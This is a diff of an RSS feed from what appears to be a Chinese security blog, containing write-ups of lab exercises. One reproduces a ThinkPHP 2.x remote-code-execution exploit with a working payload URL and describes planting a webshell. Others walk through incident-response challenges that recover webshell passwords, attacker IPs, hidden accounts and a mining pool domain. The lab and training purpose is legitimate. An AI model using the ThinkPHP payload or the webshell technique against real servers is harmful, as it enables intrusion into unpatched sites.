@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
-        <title>靶场 on Slimer</title>
+        <title>靶场 on SlimerのBlog</title>
         <link>http://localhost:1313/categories/%E9%9D%B6%E5%9C%BA/</link>
-        <description>Recent content in 靶场 on Slimer</description>
+        <description>Recent content in 靶场 on SlimerのBlog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Slimer</copyright>
@@ -13,8 +13,8 @@
         <pubDate>Tue, 02 Sep 2025 00:00:00 +0000</pubDate>
         
         <guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-thinkphp-2.x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</guid>
-        <description>&lt;img src="http://localhost:1313/images/29.webp" alt="Featured image of post 【Thinkphp】漏洞复现-ThinkPHP 2.x-任意代码执行" /&gt;&lt;h1 id=&#34;0x00-实验环境&#34;&gt;0x00 实验环境
-&lt;/h1&gt;&lt;p&gt;攻击机：Win 11&lt;br&gt;
+        <description>&lt;img src="http://localhost:1313/images/29.webp" alt="Featured image of post 【Thinkphp】漏洞复现-ThinkPHP 2.x-任意代码执行" /&gt;&lt;h1 id=&#34;0x00-实验环境&#34;&gt;0x00 实验环境&lt;/h1&gt;
+&lt;p&gt;攻击机：Win 11&lt;br&gt;
 靶机也可作为攻击机：Ubuntu20 （docker搭建的vulhub靶场）&lt;br&gt;
 vulhub靶场下载地址：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -38,18 +38,9 @@ vulhub靶场下载地址：&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker ps
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134038.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h1 id=&#34;0x01-影响版本&#34;&gt;0x01 影响版本
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;标志&lt;/strong&gt;：/index.php&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134038.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;0x01-影响版本&#34;&gt;0x01 影响版本&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;标志&lt;/strong&gt;：/index.php&lt;br&gt;
 &lt;strong&gt;版本&lt;/strong&gt;：thinkphp2.x&lt;br&gt;
 &lt;strong&gt;简介&lt;/strong&gt;：在ThinkPHP 2.x版本中，使用preg_replace的&lt;code&gt;/e&lt;/code&gt;模式匹配路由：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -84,19 +75,10 @@ vulhub靶场下载地址：&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;只要在“just test”中匹配到了“test”字符，就执行中间的print_r这条函数的命令。&lt;/p&gt;
-&lt;h1 id=&#34;0x02-漏洞复现&#34;&gt;0x02 漏洞复现
-&lt;/h1&gt;&lt;p&gt;注：复现是比较简单的，原理需要自己去深入剖析&lt;br&gt;
+&lt;h1 id=&#34;0x02-漏洞复现&#34;&gt;0x02 漏洞复现&lt;/h1&gt;
+&lt;p&gt;注：复现是比较简单的，原理需要自己去深入剖析&lt;br&gt;
 （1）访问页面&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134411.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134411.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 （2）使用报错爆出thinkphp的版本2.1：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -106,27 +88,9 @@ vulhub靶场下载地址：&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://192.168.197.140:8080/index.php/111
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134632.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134632.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
  （3）抓包或者使用插件查看一下有没有php的版本号，上面有介绍过，那个命令执行的触发条件&amp;lt;=php5.6.29，下面这个版本是满足条件的：&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134623.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134623.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 （4）漏洞利用：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -136,16 +100,7 @@ vulhub靶场下载地址：&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://192.168.197.140:8080/index.php?s=/index/index/xxx/${@phpinfo()}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134735.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134735.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 （5）传马，使用以下语句（类似于在该页面写入了一句话木马）：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -157,28 +112,10 @@ vulhub靶场下载地址：&lt;/p&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;菜刀与蚁剑均能连接：&lt;br&gt;
 蚁剑连接：&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902135056.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902135103.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h1 id=&#34;0x02-漏洞修复&#34;&gt;0x02 漏洞修复
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;升级框架版本&lt;/strong&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902135056.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902135103.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;0x02-漏洞修复&#34;&gt;0x02 漏洞修复&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;升级框架版本&lt;/strong&gt;&lt;br&gt;
 ThinkPHP 2.x 已停止维护，漏洞无法通过零散修复彻底解决。&lt;strong&gt;最彻底的方式是升级到官方支持的最新版本&lt;/strong&gt;（如 ThinkPHP 5.1 或 6.x），这些版本对输入过滤、路由解析等机制进行了全面重构，安全性大幅提升。&lt;/p&gt;
 </description>
         </item>
@@ -188,56 +125,27 @@ ThinkPHP 2.x 已停止维护，漏洞无法通过零散修复彻底解决。&lt;
         <pubDate>Mon, 01 Sep 2025 00:00:00 +0000</pubDate>
         
         <guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-emlog/</guid>
-        <description>&lt;img src="http://localhost:1313/images/25.webp" alt="Featured image of post 【玄机靶场】第四章 windows 实战-emlog" /&gt;&lt;h1 id=&#34;简介&#34;&gt;简介
-&lt;/h1&gt;&lt;p&gt;服务器场景操作系统 Windows&lt;br&gt;
+        <description>&lt;img src="http://localhost:1313/images/25.webp" alt="Featured image of post 【玄机靶场】第四章 windows 实战-emlog" /&gt;&lt;h1 id=&#34;简介&#34;&gt;简介&lt;/h1&gt;
+&lt;p&gt;服务器场景操作系统 Windows&lt;br&gt;
 服务器账号密码 administrator xj@123456&lt;br&gt;
 题目来源公众号 知攻善防实验室&lt;br&gt;
-&lt;a class=&#34;link&#34; href=&#34;https://mp.weixin.qq.com/s/89IS3jPePjBHFKPXnGmKfA&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://mp.weixin.qq.com/s/89IS3jPePjBHFKPXnGmKfA&lt;/a&gt;&lt;br&gt;
+&lt;a href=&#34;https://mp.weixin.qq.com/s/89IS3jPePjBHFKPXnGmKfA&#34;&gt;https://mp.weixin.qq.com/s/89IS3jPePjBHFKPXnGmKfA&lt;/a&gt;&lt;br&gt;
 任务环境说明&lt;br&gt;
 注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！&lt;br&gt;
 应急响应工程师小王某人收到安全设备告警服务器被植入恶意文件，请上机排查&lt;br&gt;
 开放题目&lt;br&gt;
 漏洞修复&lt;br&gt;
 参考&lt;br&gt;
-&lt;a class=&#34;link&#34; href=&#34;https://mp.weixin.qq.com/s/1gebC1OkDgtz4k4YtN10dg&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://mp.weixin.qq.com/s/1gebC1OkDgtz4k4YtN10dg&lt;/a&gt;&lt;/p&gt;
-&lt;h1 id=&#34;靶机启动&#34;&gt;靶机启动
-&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320132002.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250320132002&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h1 id=&#34;过程&#34;&gt;过程
-&lt;/h1&gt;&lt;h2 id=&#34;flag1&#34;&gt;flag1
-&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;&lt;/strong&gt;&lt;br&gt;
+&lt;a href=&#34;https://mp.weixin.qq.com/s/1gebC1OkDgtz4k4YtN10dg&#34;&gt;https://mp.weixin.qq.com/s/1gebC1OkDgtz4k4YtN10dg&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&#34;靶机启动&#34;&gt;靶机启动&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320132002.png&#34; alt=&#34;Pasted image 20250320132002&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;过程&#34;&gt;过程&lt;/h1&gt;
+&lt;h2 id=&#34;flag1&#34;&gt;flag1&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;&lt;/strong&gt;&lt;br&gt;
 上传D盾,直接扫就行.&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320132223.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250320132223&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320132223.png&#34; alt=&#34;Pasted image 20250320132223&#34;&gt;&lt;br&gt;
 打开文件,发现默认密码&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320132347.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250320132347&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320132347.png&#34; alt=&#34;Pasted image 20250320132347&#34;&gt;&lt;br&gt;
 flag&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -247,8 +155,8 @@ flag&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{rebeyond}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;flag2&#34;&gt;flag2
-&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;&lt;/strong&gt;&lt;br&gt;
+&lt;/div&gt;&lt;h2 id=&#34;flag2&#34;&gt;flag2&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;&lt;/strong&gt;&lt;br&gt;
 查看apache.log文件,发现写入了webshell.php文件.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -258,16 +166,7 @@ flag&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;log日志地址:C:\phpstudy_pro\Extensions\Apache2.4.39\logs
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320133630.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250320133630&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320133630.png&#34; alt=&#34;Pasted image 20250320133630&#34;&gt;&lt;br&gt;
 flag:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -277,19 +176,10 @@ flag:&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{192.168.126.1}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;flag3&#34;&gt;flag3
-&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;&lt;/strong&gt;&lt;br&gt;
+&lt;/div&gt;&lt;h2 id=&#34;flag3&#34;&gt;flag3&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;&lt;/strong&gt;&lt;br&gt;
 直接使用工具,即可&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320134054.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250320134054&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320134054.png&#34; alt=&#34;Pasted image 20250320134054&#34;&gt;&lt;br&gt;
 flag:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -299,49 +189,13 @@ flag:&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{hacker138}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;flag4&#34;&gt;flag4
-&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;&lt;/strong&gt;&lt;br&gt;
+&lt;/div&gt;&lt;h2 id=&#34;flag4&#34;&gt;flag4&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;&lt;/strong&gt;&lt;br&gt;
 找到hacker128用户的桌面,发现一个恶意的挖矿程序,然后进行反编译一下,得到flag&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320134714.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250320134714&#34;
-	
-	
-&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320134701.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250320134701&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320134701.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250320134701&#34;
-	
-	
-&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320134647.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250320134647&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320134714.png&#34; alt=&#34;Pasted image 20250320134714&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320134701.png&#34; alt=&#34;Pasted image 20250320134701&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320134701.png&#34; alt=&#34;Pasted image 20250320134701&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320134647.png&#34; alt=&#34;Pasted image 20250320134647&#34;&gt;&lt;br&gt;
 flag&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -359,24 +213,15 @@ flag&lt;/p&gt;
         <pubDate>Mon, 01 Sep 2025 00:00:00 +0000</pubDate>
         
         <guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-wordpress/</guid>
-        <description>&lt;img src="http://localhost:1313/images/26.webp" alt="Featured image of post 【玄机靶场】第四章 windows 实战-wordpress" /&gt;&lt;h1 id=&#34;简介&#34;&gt;简介
-&lt;/h1&gt;&lt;p&gt;第四章 windows实战-wordpress&lt;br&gt;
+        <description>&lt;img src="http://localhost:1313/images/26.webp" alt="Featured image of post 【玄机靶场】第四章 windows 实战-wordpress" /&gt;&lt;h1 id=&#34;简介&#34;&gt;简介&lt;/h1&gt;
+&lt;p&gt;第四章 windows实战-wordpress&lt;br&gt;
 rdp 端口 3389&lt;br&gt;
 账号：administrator&lt;br&gt;
 密码：xj@123456&lt;/p&gt;
-&lt;h1 id=&#34;flag1&#34;&gt;flag1
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}&lt;/strong&gt;&lt;br&gt;
+&lt;h1 id=&#34;flag1&#34;&gt;flag1&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}&lt;/strong&gt;&lt;br&gt;
 登录后台，获取后台地址：http://localhost:8080/manage/login.php&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325154712.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250325154712&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325154712.png&#34; alt=&#34;Pasted image 20250325154712&#34;&gt;&lt;br&gt;
 在日志里筛选一下：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -416,8 +261,8 @@ rdp 端口 3389&lt;br&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{2023:04:29 22:45:23}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;flag2&#34;&gt;flag2
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;请提交攻击者的浏览器版本 flag{Firgfox/2200}&lt;/strong&gt;&lt;br&gt;
+&lt;/div&gt;&lt;h1 id=&#34;flag2&#34;&gt;flag2&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;请提交攻击者的浏览器版本 flag{Firgfox/2200}&lt;/strong&gt;&lt;br&gt;
 由flag1可知&lt;br&gt;
 flag&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -428,8 +273,8 @@ flag&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{Firefox/110.0}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;flag3&#34;&gt;flag3
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;请提交攻击者目录扫描所使用的工具名称&lt;/strong&gt;&lt;br&gt;
+&lt;/div&gt;&lt;h1 id=&#34;flag3&#34;&gt;flag3&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;请提交攻击者目录扫描所使用的工具名称&lt;/strong&gt;&lt;br&gt;
 可以看出扫描器的特征：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -439,16 +284,7 @@ flag&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Fuzz Faster U Fool v1.5.0
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325155258.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250325155258&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325155258.png&#34; alt=&#34;Pasted image 20250325155258&#34;&gt;&lt;br&gt;
 flag&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -458,29 +294,11 @@ flag&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{Fuzz Faster U Fool}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;flag4&#34;&gt;flag4
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;找到攻击者写入的恶意后门文件，提交文件名（完整路径）&lt;/strong&gt;&lt;br&gt;
+&lt;/div&gt;&lt;h1 id=&#34;flag4&#34;&gt;flag4&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;找到攻击者写入的恶意后门文件，提交文件名（完整路径）&lt;/strong&gt;&lt;br&gt;
 查看日志：&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325151625.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250325151625&#34;
-	
-	
-&gt;&lt;br&gt;
